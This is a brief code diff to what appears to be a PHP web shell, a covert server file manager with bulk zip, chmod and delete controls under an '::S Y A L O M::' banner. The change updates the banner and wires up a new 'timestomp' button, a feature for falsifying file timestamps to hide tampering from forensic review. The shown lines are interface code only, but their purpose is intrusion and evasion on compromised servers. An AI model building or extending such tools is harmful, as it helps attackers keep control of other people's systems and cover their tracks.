@@ -2724,7 +2724,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::S Y A L O M:: ~ 270326 1956</h1>
+        <h1>::S Y A L O M:: ~ 270326 2020</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -3632,6 +3632,7 @@ selectAllCheckbox.addEventListener('change', function() {
     const anyChecked = this.checked && checkboxes.length > 0;
     zipBtn.disabled = !anyChecked;
     chmodBulkBtn.disabled = !anyChecked;
+    timestompBtn.disabled = !anyChecked;
     deleteBtn.disabled = !anyChecked;
 });
 zipBtn.addEventListener('click', function() {
